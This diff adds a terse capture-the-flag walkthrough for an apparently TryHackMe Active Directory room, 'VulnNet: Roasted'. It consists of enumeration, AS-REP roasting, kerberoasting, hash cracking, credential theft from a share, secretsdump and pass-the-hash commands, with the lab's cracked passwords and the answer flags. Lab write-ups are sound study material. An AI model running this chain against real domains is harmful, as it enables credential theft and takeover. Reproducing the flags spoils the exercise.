@@ -1,0 +1,31 @@
+		
+									 VulnNet: Roasted 
+								----------------------------------
+
+1. What is the user flag? (Desktop\user.txt)
+ans: THM{726b7c0baaac1455d05c827b5561f4ed}
+command: nmap -sC -sV -vv 10.10.253.123 -o nmap.txt
+command: smbmap -H 10.10.253.123 -u anonymous
+	 (Readable IPC$ means username enumeration)
+command: python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.253.123
+         Extract the users (SidTypeUser) into the file “usernames.txt”
+command: python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile usernames.txt -no-pass -dc-ip 10.10.253.123
+command: hashcat -m 18200 getnpuser_hash.txt /usr/share/wordlists/rockyou.txt (value:tj072889*)
+	 (use this creds to kerberoast)
+command: python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hash_skid.kerberoast -dc-ip 10.10.253.123
+command: hashcat -m 13100 hash_skid.kerberoast /usr/share/wordlists/rockyou.txt (value:ry=ibfkfv,s6h,) 
+command: evil-winrm -i 10.10.253.123 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
+command: type ..\desktop\user.txt
+
+2. What is the system flag? (Desktop\system.txt)
+ans: THM{16f45e3934293a57645f8d7bf71d8d4c}
+command: smbmap -H 10.10.253.123 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
+command: smbclient //10.10.253.123/NETLOGON --user=enterprise-core-vn%ry=ibfkfv,s6h,
+command: ls 
+command: mget * 
+command: cat ResetPassword.vbs (this file is in smb_netlogon folder) (a-whitehat:bNdKVkjv3RR9ht)
+	 (Use the obtained creds to enumerate SMB again)
+command: smbmap -H 10.10.253.123 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' 
+command: python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.253.123
+command: evil-winrm -i 10.10.253.123 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
+command: type ..\Desktop\system.txt
